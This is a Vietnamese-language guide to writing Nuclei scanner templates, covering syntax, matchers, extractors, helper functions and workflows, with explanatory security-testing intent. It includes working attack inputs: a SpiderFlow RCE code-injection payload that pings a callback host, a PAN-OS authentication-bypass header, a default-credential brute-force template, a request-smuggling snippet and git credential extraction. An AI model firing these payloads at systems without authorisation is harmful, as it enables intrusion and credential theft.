# Tìm Hiểu Format Nuclei Templates

> Tài liệu này tổng hợp và giải thích cấu trúc, cú pháp của Nuclei templates dựa trên tài liệu chính thức (`doc_modules/nuclei-docs`) và các template thực tế trong kho `nuclei-templates`.

---

## Mục lục

1. [Tổng quan](#1-tổng-quan)
2. [Cấu trúc cơ bản của Template](#2-cấu-trúc-cơ-bản-của-template)
3. [Block `info` — Thông tin Template](#3-block-info--thông-tin-template)
4. [Protocol HTTP](#4-protocol-http)
5. [Protocol DNS](#5-protocol-dns)
6. [Protocol Network (TCP)](#6-protocol-network-tcp)
7. [Matchers — Bộ So Khớp](#7-matchers--bộ-so-khớp)
8. [Extractors — Bộ Trích Xuất](#8-extractors--bộ-trích-xuất)
9. [Variables & Constants](#9-variables--constants)
10. [Preprocessors](#10-preprocessors)
11. [Helper Functions](#11-helper-functions)
12. [Workflows](#12-workflows)
13. [Multi-Protocol Templates](#13-multi-protocol-templates)
14. [Ví dụ Thực Tế](#14-ví-dụ-thực-tế)

---

## 1. Tổng quan

**Nuclei** là công cụ quét bảo mật dựa trên template YAML. Mỗi template định nghĩa:
- Các request cần gửi đến mục tiêu
- Cách kiểm tra (match) response để xác định lỗ hổng

Ưu điểm chính:
- **YAML đơn giản**: Dễ đọc, dễ viết và chia sẻ
- **Mở rộng cao**: Hỗ trợ HTTP, DNS, TCP, Headless browser, Code...
- **Mạnh mẽ**: DSL expressions, helper functions, multi-protocol

---

## 2. Cấu trúc cơ bản của Template

Mỗi file template YAML bao gồm các phần chính:

```yaml
id: <định-danh-duy-nhất>

info:
  name: <tên hiển thị>
  author: <tác giả>
  severity: <mức độ: info|low|medium|high|critical>
  description: <mô tả ngắn>
  tags: <tag1,tag2,...>

# Một hoặc nhiều protocol block:
http:
  - ...

dns:
  - ...

tcp:
  - ...
```

### Quy tắc `id`
- **Bắt buộc**, duy nhất trong toàn bộ repository
- **Không được chứa khoảng trắng**
- Thường dùng dạng `kebab-case`: `git-config`, `CVE-2024-0012`

---

## 3. Block `info` — Thông tin Template

Block `info` là **bắt buộc** và chứa metadata mô tả template.

```yaml
info:
  name: Git Configuration - Detect
  author: pdteam,pikpikcu
  severity: medium
  description: Phát hiện file .git/config bị lộ trên web server.
  impact: |
    Kẻ tấn công có thể đọc thông tin credentials của git repository.
  remediation: |
    Chặn truy cập vào thư mục .git/ tại web server.
  reference:
    - https://www.acunetix.com/vulnerabilities/web/git-repository-found/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cve-id: CVE-XXXX-XXXX      # nếu là CVE
    cwe-id: CWE-200
    epss-score: 0.91704
    epss-percentile: 0.99696
    cpe: cpe:2.3:a:vendor:product:version:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1             # số lượng request tối đa
    vendor: vendor-name
    product: product-name
    shodan-query: 'http.title:"Product Name"'
    fofa-query: 'title="Product Name"'
  tags: config,git,exposure,vuln
```

### Các trường trong `info`

| Trường | Bắt buộc | Mô tả |
|--------|----------|-------|
| `name` | Có | Tên đầy đủ của template |
| `author` | Có | Tác giả (nhiều người dùng dấu phẩy) |
| `severity` | Có | `info`, `low`, `medium`, `high`, `critical`, `none` |
| `description` | Không | Mô tả lỗ hổng |
| `impact` | Không | Tác động nếu bị khai thác |
| `remediation` | Không | Cách khắc phục |
| `reference` | Không | Danh sách URL tham khảo |
| `classification` | Không | Thông tin CVSS, CVE, CWE, EPSS |
| `metadata` | Không | Metadata tùy chỉnh (shodan query, max-request...) |
| `tags` | Không | Tag phân loại, dùng để filter khi chạy |

---

## 4. Protocol HTTP

Block HTTP là phổ biến nhất trong Nuclei templates.

### 4.1 Request đơn giản (Method-based)

```yaml
http:
  - method: GET
    path:
      - "{{BaseURL}}/.git/config"
    headers:
      User-Agent: Mozilla/5.0
      Accept: application/json
    body: '{"key": "value"}'      # chỉ dùng cho POST/PUT
    redirects: true
    max-redirects: 3
```

### 4.2 Biến URL tích hợp sẵn

Nuclei cung cấp các biến động được thay thế tại runtime:

| Biến | Giá trị (ví dụ với `https://example.com:443/foo/bar.php`) |
|------|-----------------------------------------------------------|
| `{{BaseURL}}` | `https://example.com:443/foo/bar.php` |
| `{{RootURL}}` | `https://example.com:443` |
| `{{Hostname}}` | `example.com:443` |
| `{{Host}}` | `example.com` |
| `{{Port}}` | `443` |
| `{{Path}}` | `/foo` |
| `{{File}}` | `bar.php` |
| `{{Scheme}}` | `https` |

**Ví dụ:**
```yaml
path:
  - "{{BaseURL}}/.git/config"
  - "{{RootURL}}/api/v1/users"
  - "{{Scheme}}://{{Host}}/.env"
```

### 4.3 RAW HTTP Request

Format raw cho phép kiểm soát hoàn toàn request:

```yaml
http:
  - raw:
      - |
        POST /api/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        username=admin&password=admin
```

**Lưu ý:** Trong RAW format, `Host: {{Hostname}}` là chuẩn. Có thể dùng helper functions trong raw request:

```yaml
- raw:
  - |
    GET /manager/html HTTP/1.1
    Host: {{Hostname}}
    Authorization: Basic {{base64('admin:password')}}
```

### 4.4 Nhiều request trong một template

```yaml
http:
  - raw:
      - |
        GET /getkey HTTP/1.1
        Host: {{Hostname}}

      - |
        GET /api/key={{token}} HTTP/1.1
        Host: api.target.com

    extractors:
      - type: regex
        name: token
        part: body
        internal: true
        regex:
          - 'api_key=([a-z0-9]+)'
```

**Request Condition** — kiểm tra điều kiện giữa nhiều requests:
```yaml
matchers:
  - type: dsl
    dsl:
      - "status_code_1 == 200 && status_code_2 == 302 && contains(body_2, 'admin')"
```

### 4.5 HTTP Payloads (Fuzzing)

Nuclei hỗ trợ 3 kiểu tấn công fuzzing:

| Kiểu | Mô tả |
|------|-------|
| `batteringram` | Dùng **một** payload, thay vào **tất cả** vị trí |
| `pitchfork` | Dùng **nhiều** payload set, chạy song song theo thứ tự |
| `clusterbomb` | Dùng **nhiều** payload set, thử **tất cả** tổ hợp |

```yaml
http:
  - raw:
      - |
        POST /login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        username={{user}}&password={{pass}}

    payloads:
      user:
        - admin
        - administrator
      pass:
        - admin
        - password
        - 123456
    attack: clusterbomb        # thử tất cả tổ hợp user x pass

    matchers:
      - type: word
        words:
          - "Welcome"
        part: body
```

Payload từ file wordlist:
```yaml
payloads:
  paths: /path/to/wordlist.txt
```

### 4.6 Request nâng cao

**Session (Cookie Reuse):**
```yaml
http:
  - raw:
      - |
        POST /login HTTP/1.1
        Host: {{Hostname}}
        ...
      - |
        GET /dashboard HTTP/1.1
        Host: {{Hostname}}
    cookie-reuse: true          # giữ cookie giữa các request
```

**Race Condition:**
```yaml
http:
  - raw:
      - |
        POST /coupon HTTP/1.1
        Host: {{Hostname}}
        code=DISCOUNT50
    race: true
    race_count: 10              # gửi đồng thời 10 request
```

**Unsafe (rawhttp — bypass RFC):**
```yaml
http:
  - raw:
      - |+
        POST / HTTP/1.1
        Host: {{Hostname}}
        Transfer-Encoding: chunked

        0

        G
    unsafe: true                # bật rawhttp client
```

**Pipeline:**
```yaml
http:
  - raw:
      - |+
        GET /{{path}} HTTP/1.1
        Host: {{Hostname}}
    unsafe: true
    pipeline: true
    pipeline-concurrent-connections: 40
    pipeline-requests-per-connection: 25000
```

**Connection Pooling:**
```yaml
http:
  - raw:
      - |
        GET /protected HTTP/1.1
        Host: {{Hostname}}
        Authorization: Basic {{base64('admin:##password##')}}
    attack: batteringram
    payloads:
      password: wordlist.txt
    threads: 40                 # số luồng kết nối
```

### 4.7 Flow Control

```yaml
flow: http(1) && http(2)        # chỉ chạy request 2 nếu request 1 match
```

---

## 5. Protocol DNS

```yaml
dns:
  - name: "{{FQDN}}"
    type: A                     # A, NS, CNAME, SOA, PTR, MX, TXT, AAAA
    class: inet
    recursion: true
    retries: 3

    matchers:
      - type: word
        words:
          - "IN\tCNAME"
          - "IN\tA"
        condition: and
```

### Các phần match trong DNS response

| `part` | Mô tả |
|--------|-------|
| `request` | DNS request |
| `rcode` | DNS response code |
| `question` | DNS question section |
| `answer` | DNS answer records |
| `extra` | DNS extra field |
| `ns` | Authority section |
| `raw` / `all` / `body` | Toàn bộ DNS message |

---

## 6. Protocol Network (TCP)

Nuclei có thể giao tiếp trực tiếp qua TCP socket, tương tự như netcat:

```yaml
tcp:
  - host:
      - "{{Hostname}}"
    inputs:
      - data: "PING\r\n"
      - data: "50494e47"        # hex encoded
        type: hex
    read-size: 8

    matchers:
      - type: word
        part: data
        words:
          - "PONG"
```

### Ví dụ đọc nhiều phần:
```yaml
inputs:
  - read-size: 8
    name: banner                # đặt tên để match về sau
  - data: "COMMAND\r\n"

matchers:
  - type: word
    part: banner
    words:
      - "SSH-2.0"
```

---

## 7. Matchers — Bộ So Khớp

Matchers xác định khi nào một request được coi là "match" (tìm thấy lỗ hổng).

### 7.1 Các loại matcher

| Loại | Mô tả |
|------|-------|
| `status` | So sánh HTTP status code (số nguyên) |
| `size` | So sánh Content-Length |
| `word` | Kiểm tra chuỗi con trong response |
| `regex` | Kiểm tra regex trong response |
| `binary` | Kiểm tra dữ liệu nhị phân (hex) |
| `dsl` | Biểu thức DSL phức tạp với helper functions |

### 7.2 Ví dụ từng loại

**Status matcher:**
```yaml
matchers:
  - type: status
    status:
      - 200
      - 302
```

**Word matcher:**
```yaml
matchers:
  - type: word
    words:
      - "[core]"
      - "[credentials]"
    condition: or               # or (mặc định) | and
    part: body                  # body (mặc định) | header | all
```

**Regex matcher:**
```yaml
matchers:
  - type: regex
    regex:
      - "root:.*:0:0:"
    part: body
```

**Binary matcher:**
```yaml
matchers:
  - type: binary
    binary:
      - "504B0304"              # zip archive
      - "526172211A070100"      # RAR v5
    condition: or
    part: body
```

**DSL matcher:**
```yaml
matchers:
  - type: dsl
    dsl:
      - "status_code == 200 && len(body) > 1024"
      - "contains(tolower(header), 'x-powered-by: php')"
      - "contains_any(body, '<title>Admin', 'Dashboard')"
```

### 7.3 Phần `part` của HTTP response

| `part` | Nội dung match |
|--------|---------------|
| `body` | Response body (mặc định) |
| `header` | Response headers |
| `all` | Headers + Body |
| `raw` | Raw response |
| `<header-name>` | Giá trị header cụ thể (dùng `_` thay `-`) |

### 7.4 Negative Matcher

```yaml
matchers:
  - type: word
    words:
      - "<html"
    part: body
    negative: true              # match khi KHÔNG chứa chuỗi này
```

### 7.5 Nhiều matchers (matchers-condition)

```yaml
matchers-condition: and         # tất cả matchers phải match (mặc định: or)
matchers:
  - type: word
    words:
      - "[core]"
    part: body

  - type: status
    status:
      - 200

  - type: dsl
    dsl:
      - "!contains(tolower(body), '<html')"
```

---

## 8. Extractors — Bộ Trích Xuất

Extractors trích xuất và hiển thị dữ liệu từ response.

### 8.1 Các loại extractor

| Loại | Mô tả |
|------|-------|
| `regex` | Trích xuất bằng regular expression |
| `kval` | Trích xuất `key=value` từ header/cookie |
| `json` | Trích xuất từ JSON (JQ syntax) |
| `xpath` | Trích xuất bằng XPath từ HTML |
| `dsl` | Trích xuất bằng DSL expression |

### 8.2 Ví dụ từng loại

**Regex extractor:**
```yaml
extractors:
  - type: regex
    part: body
    regex:
      - "(AKIA[A-Z0-9]{16})"   # AWS Access Key
```

**Kval extractor:**
```yaml
extractors:
  - type: kval
    kval:
      - content_type           # trích xuất header Content-Type (- thành _)
      - set_cookie
```

**JSON extractor:**
```yaml
extractors:
  - type: json
    part: body
    json:
      - '.[] | .id'            # JQ syntax
      - '.access_token'
```

**XPath extractor:**
```yaml
extractors:
  - type: xpath
    attribute: href
    xpath:
      - '//a[@class="login"]'
```

**DSL extractor:**
```yaml
extractors:
  - type: dsl
    dsl:
      - 'len(body)'
      - 'status_code'
```

### 8.3 Dynamic Extractor (cho Multi-Request)

Dynamic extractor lưu giá trị vào biến để dùng trong các request tiếp theo:

```yaml
http:
  - raw:
      - |
        GET /login HTTP/1.1
        Host: {{Hostname}}

      - |
        POST /api/action HTTP/1.1
        Host: {{Hostname}}
        X-CSRF-Token: {{csrf_token}}    # dùng biến đã extract

    extractors:
      - type: regex
        name: csrf_token                # tên biến
        part: body
        internal: true                  # không in ra terminal, chỉ dùng nội bộ
        group: 1                        # capture group số 1
        regex:
          - 'csrf_token["\s:=]+([a-z0-9]{32})'
```

---

## 9. Variables & Constants

### 9.1 Variables

Variables được tính toán một lần khi template load, không thay đổi trong suốt quá trình chạy:

```yaml
variables:
  a1: "test"                    # chuỗi tĩnh
  a2: "{{to_lower(rand_base(5))}}"  # DSL function

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        X-Custom: {{a1}}
        X-Token: {{a2}}
```

**Protocols hỗ trợ variables:** `dns`, `http`, `headless`, `network`

### 9.2 Constants

Constants tương tự variables nhưng **không thể override** qua CLI (`-V`):

```yaml
constants:
  endpoint: "/api/v1/users"
  magic_bytes: "cafebabe"

http:
  - method: GET
    path:
      - "{{BaseURL}}{{endpoint}}"
```

---

## 10. Preprocessors

Preprocessors chạy ngay khi template được load.

### `randstr` — Random ID

```yaml
http:
  - method: POST
    path:
      - "{{BaseURL}}/search"
    headers:
      X-Trace-ID: "{{randstr}}"   # random ID, nhất quán trong cùng template run

    matchers:
      - type: word
        words:
          - "{{randstr}}"          # có thể dùng trong matcher
        part: body
```

Nhiều randstr:
```yaml
X-Id-1: "{{randstr}}"
X-Id-2: "{{randstr_1}}"           # randstr khác
X-Id-3: "{{randstr_2}}"
```

---

## 11. Helper Functions

Nuclei cung cấp rất nhiều hàm hỗ trợ trong DSL expressions và RAW requests.

### 11.1 Encoding / Decoding

| Hàm | Mô tả | Ví dụ |
|-----|-------|-------|
| `base64(input)` | Base64 encode | `base64("Hello")` → `SGVsbG8=` |
| `base64_decode(input)` | Base64 decode | `base64_decode("SGVsbG8=")` → `Hello` |
| `url_encode(input)` | URL encode | `url_encode("a=1&b=2")` |
| `url_decode(input)` | URL decode | |
| `hex_encode(input)` | Hex encode | `hex_encode("aa")` → `6161` |
| `hex_decode(input)` | Hex decode | `hex_decode("6161")` → `aa` |
| `html_escape(input)` | HTML escape | `html_escape("<b>")` → `&lt;b&gt;` |
| `html_unescape(input)` | HTML unescape | |
| `gzip(input)` | Gzip compress | |
| `gzip_decode(input)` | Gzip decompress | |

### 11.2 Hashing

| Hàm | Mô tả |
|-----|-------|
| `md5(input)` | MD5 hash |
| `sha1(input)` | SHA1 hash |
| `sha256(input)` | SHA256 hash |
| `mmh3(input)` | MurmurHash3 |
| `hmac(algo, data, secret)` | HMAC (`sha1`, `sha256`, `md5`) |

### 11.3 Chuỗi

| Hàm | Mô tả | Ví dụ |
|-----|-------|-------|
| `contains(input, sub)` | Kiểm tra chứa chuỗi con | `contains("Hello", "ell")` → `true` |
| `contains_all(input, subs...)` | Kiểm tra chứa tất cả | |
| `contains_any(input, subs...)` | Kiểm tra chứa ít nhất một | |
| `starts_with(str, prefix...)` | Kiểm tra bắt đầu bằng | |
| `ends_with(str, suffix...)` | Kiểm tra kết thúc bằng | |
| `to_lower(input)` | Chuyển thường | `to_lower("HELLO")` → `hello` |
| `to_upper(input)` | Chuyển hoa | |
| `trim(input, chars)` | Xóa ký tự đầu/cuối | `trim("  hi  ", " ")` → `hi` |
| `replace(str, old, new)` | Thay chuỗi | |
| `replace_regex(src, regex, rep)` | Thay bằng regex | |
| `regex(pattern, input)` | Kiểm tra regex | `regex("H[a-z]+o", "Hello")` → `true` |
| `len(arg)` | Độ dài | `len("Hello")` → `5` |
| `concat(args...)` | Nối chuỗi | `concat("a", "b", 3)` → `ab3` |
| `split(input, sep)` | Tách chuỗi | `split("a,b,c", ",")` → `[a b c]` |
| `join(sep, elems...)` | Nối mảng | `join("_", "a", "b")` → `a_b` |
| `repeat(str, n)` | Lặp chuỗi | `repeat("../", 3)` → `../../../` |
| `reverse(input)` | Đảo ngược | `reverse("abc")` → `cba` |

### 11.4 Random

| Hàm | Mô tả |
|-----|-------|
| `rand_base(n, charset?)` | Random string n ký tự |
| `rand_char(charset?)` | Random 1 ký tự |
| `rand_int(min?, max?)` | Random số nguyên |
| `rand_text_alpha(n, bad?)` | Random n chữ cái |
| `rand_text_alphanumeric(n, bad?)` | Random n chữ-số |
| `rand_ip(cidr...)` | Random IP từ CIDR |

### 11.5 Chuyển đổi số

| Hàm | Mô tả |
|-----|-------|
| `dec_to_hex(n)` | Thập phân → hex |
| `hex_to_dec(n)` | Hex → thập phân |
| `bin_to_dec(n)` | Nhị phân → thập phân |
| `oct_to_dec(n)` | Bát phân → thập phân |

### 11.6 Thời gian

```yaml
dsl:
  - 'date_time("%Y-%M-%D %H:%m")'        # ngày giờ hiện tại
  - 'unix_time()'                         # Unix timestamp
  - 'to_unix_time("2024-01-01T00:00:00")' # parse date → unix
```

### 11.7 Mạng

```yaml
dsl:
  - 'resolve("example.com", 4)'           # DNS lookup IPv4
  - 'ip_format("127.0.0.1", 3)'           # chuyển đổi format IP
```

### 11.8 Bảo mật / Crypto

```yaml
dsl:
  - 'generate_java_gadget("dns", "{{interactsh-url}}", "base64")'
  - 'generate_jwt("{\"sub\":\"admin\"}", "HS256", "secret")'
  - 'compare_versions("v1.2.3", ">v1.0.0", "<v2.0.0")'
```

---

## 12. Workflows

Workflows điều phối thứ tự thực thi các templates.

### 12.1 Generic Workflow

```yaml
id: cms-scan-workflow

info:
  name: CMS Vulnerability Scan
  author: pdteam
  severity: info

workflows:
  - template: technologies/wordpress-detect.yaml
  - template: cves/wordpress/
  - tags: wordpress,cms
```

### 12.2 Conditional Workflow

Template con chỉ chạy khi template cha match:

```yaml
workflows:
  - template: technologies/jira-detect.yaml
    subtemplates:
      - tags: jira
      - template: exploits/jira/
```

Kiểm tra theo tên matcher:

```yaml
workflows:
  - template: technologies/tech-detect.yaml
    matchers:
      - name: wordpress               # chỉ chạy nếu matcher "wordpress" match
        subtemplates:
          - template: exploits/wordpress-sqli.yaml
          - template: exploits/wordpress-rce.yaml
      - name: joomla
        subtemplates:
          - template: exploits/joomla/
```

### 12.3 Nested Conditional Workflow

```yaml
workflows:
  - template: technologies/tech-detect.yaml
    matchers:
      - name: lotus-domino
        subtemplates:
          - template: technologies/lotus-domino-version.yaml
            subtemplates:
              - template: cves/lotus/CVE-2021-XXXX.yaml
```

### 12.4 Shared Execution Context

Các template trong cùng workflow chia sẻ biến (extractors được đặt tên):

```yaml
# workflow.yaml
workflows:
  - template: step1-get-token.yaml
    subtemplates:
      - template: step2-use-token.yaml

# step1-get-token.yaml — extract token
extractors:
  - type: regex
    name: auth_token
    part: body
    regex:
      - '"token":"([^"]+)"'
    group: 1

# step2-use-token.yaml — dùng token đã extract
http:
  - raw:
      - |
        GET /admin HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{auth_token}}
```

---

## 13. Multi-Protocol Templates

Từ Nuclei v3.0, một template có thể kết hợp nhiều protocol:

```yaml
id: subdomain-takeover-check

info:
  name: Subdomain Takeover Detection
  author: pdteam
  severity: high

dns:
  - name: "{{FQDN}}"
    type: CNAME
    extractors:
      - type: dsl
        name: cname_value
        dsl:
          - cname
        internal: true          # lưu vào template context

http:
  - method: GET
    path:
      - "{{BaseURL}}"
    matchers:
      - type: dsl
        condition: and
        dsl:
          - 'contains(body, "Domain not found")'
          - 'contains(cname_value, "github.io")'    # dùng biến từ DNS
```

---

## 14. Ví dụ Thực Tế

### 14.1 Phát hiện Git Config bị lộ

```yaml
id: git-config

info:
  name: Git Configuration - Detect
  author: pdteam,pikpikcu,Mah3Sec_,m4lwhere
  severity: medium
  description: Git configuration was detected via the pattern /.git/config.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cwe-id: CWE-200
  metadata:
    max-request: 1
  tags: config,git,exposure,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/.git/config"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "[credentials]"
          - "[core]"
        condition: or

      - type: dsl
        dsl:
          - "!contains(tolower(body), '<html')"
          - "!contains(tolower(body), '<body')"
        condition: and

      - type: status
        status:
          - 200

    extractors:
      - type: regex
        part: body
        group: 1
        regex:
          - "url ?= ?https?://(.*:.*)@"      # trích xuất credentials từ URL
          - "pass = (.*)"
```

**Phân tích:**
- Template đơn giản với 1 GET request
- Dùng `matchers-condition: and` — cả 3 matchers phải đúng
- Matcher 1: body chứa `[credentials]` hoặc `[core]`
- Matcher 2: body không phải HTML (tránh false positive trang 404)
- Matcher 3: status code 200
- Extractor trích xuất credentials nếu có

---

### 14.2 CVE với Multi-Step + OOB (Out-of-Band)

```yaml
id: CVE-2024-0195

info:
  name: SpiderFlow - Remote Code Execution
  author: pussycat0x
  severity: critical
  classification:
    cvss-score: 9.8
    cve-id: CVE-2024-0195
    cwe-id: CWE-94
  metadata:
    verified: true
    max-request: 2
  tags: cve,cve2024,spiderflow,rce

flow: http(1) && http(2)        # request 2 chỉ chạy khi request 1 match

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        internal: true          # matcher này chỉ dùng để flow control
        words:
          - 'SPIDER_FLOW_VERSION'

  - raw:
      - |
        POST /function/save HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        id=1&name=cmd&script=%7DJava.type('java.lang.Runtime').getRuntime().exec('ping+{{interactsh-url}}')%3B%7B

    matchers:
      - type: word
        part: interactsh_protocol    # OOB detection qua Interactsh
        words:
          - "dns"
```

**Phân tích:**
- `flow: http(1) && http(2)`: kiểm tra fingerprint trước khi exploit
- Request 1: xác nhận target là SpiderFlow
- Request 2: gửi payload RCE với `{{interactsh-url}}` để phát hiện DNS callback
- Matcher OOB: detect lỗ hổng qua DNS lookup (không cần kiểm tra HTTP response)

---

### 14.3 Authentication Bypass với Header đặc biệt

```yaml
id: CVE-2024-0012

info:
  name: PAN-OS - Authentication Bypass
  author: johnk3r,watchtowr
  severity: critical
  classification:
    cvss-score: 9.8
    cve-id: CVE-2024-0012
    cwe-id: CWE-306
  metadata:
    verified: true
    max-request: 1
    shodan-query: http.favicon.hash:"-631559155"
  tags: cve,cve2024,paloalto,auth-bypass

http:
  - raw:
      - |
        GET /php/ztp_gate.php/.js.map HTTP/1.1
        Host: {{Hostname}}
        X-PAN-AUTHCHECK: off            # header bypass authentication

    matchers:
      - type: dsl
        condition: and
        dsl:
          - 'contains_any(body, "<title>Zero Touch Provisioning", "Zero Touch Provisioning (ZTP)")'
          - 'contains(body, "/scripts/cache/mainui.javascript")'
          - 'contains(header, "PHPSESSID=")'
          - 'status_code == 200'
```

**Phân tích:**
- Bypass auth bằng header `X-PAN-AUTHCHECK: off`
- DSL matcher với `condition: and` + `contains_any()` phát hiện nhiều chuỗi
- Kết hợp kiểm tra body, header và status code

---

## Tổng kết cấu trúc template đầy đủ

```yaml
id: template-id                         # BẮT BUỘC: định danh duy nhất

info:                                   # BẮT BUỘC
  name: Template Name
  author: author-name
  severity: medium
  description: |
    Mô tả template.
  reference:
    - https://example.com
  classification:
    cvss-score: 5.3
    cve-id: CVE-XXXX-XXXX
    cwe-id: CWE-200
  metadata:
    max-request: 2
    verified: true
  tags: tag1,tag2,tag3

variables:                              # tùy chọn: biến dùng lại
  target_path: "/api/v1"

constants:                              # tùy chọn: hằng số không override được
  magic: "cafebabe"

flow: http(1) && http(2)               # tùy chọn: điều khiển luồng thực thi

http:
  - method: GET
    path:
      - "{{BaseURL}}{{target_path}}"
    headers:
      X-Custom: "{{magic}}"
    redirects: true
    max-redirects: 3

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "sensitive data"
        part: body
      - type: dsl
        dsl:
          - "len(body) > 100"

    extractors:
      - type: regex
        part: body
        regex:
          - 'api_key=([a-z0-9]+)'
        group: 1
```
